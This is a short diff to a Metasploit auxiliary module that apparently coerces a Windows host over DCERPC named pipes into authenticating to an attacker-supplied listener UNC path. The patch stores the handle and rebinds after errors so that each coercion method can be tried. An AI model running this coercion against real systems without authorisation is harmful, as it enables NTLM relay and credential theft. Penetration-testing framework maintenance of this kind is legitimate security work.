@@ -82,15 +82,15 @@ class MetasploitModule < Msf::Auxiliary
     handle_args = PIPE_HANDLES[datastore['PIPE'].to_sym]
     fail_with(Failure::BadConfig, "Invalid pipe: #{datastore['PIPE']}") unless handle_args
 
-    handle = dcerpc_handle(
+    @handle = dcerpc_handle(
       handle_args[:uuid],
       handle_args.fetch(:version, '1.0'),
       handle_args.fetch(:protocol, 'ncacn_np'),
       handle_args[:opts]
     )
-    vprint_status("Binding to #{handle} ...")
-    dcerpc_bind(handle)
-    vprint_status("Bound to #{handle} ...")
+    vprint_status("Binding to #{@handle} ...")
+    dcerpc_bind(@handle)
+    vprint_status("Bound to #{@handle} ...")
 
     if datastore['METHOD'] == 'Automatic'
       methods = METHODS
@@ -104,7 +104,15 @@ class MetasploitModule < Msf::Auxiliary
         method,
         file_name: "\\\\#{datastore['LISTENER']}\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\#{Rex::Text.rand_text_alphanumeric(4..8)}.#{Rex::Text.rand_text_alphanumeric(3)}"
       )
-      next if response.nil?
+      if response.nil?
+        unless method == methods.last
+          # rebind if we got a DCERPC error (as indicated by no response) and there are more methods to try
+          vprint_status("Rebinding to #{@handle} ...")
+          dcerpc_bind(@handle)
+        end
+
+        next
+      end
 
       error_status = response.error_status.to_i
       win32_error = ::WindowsError::Win32.find_by_retval(error_status).first
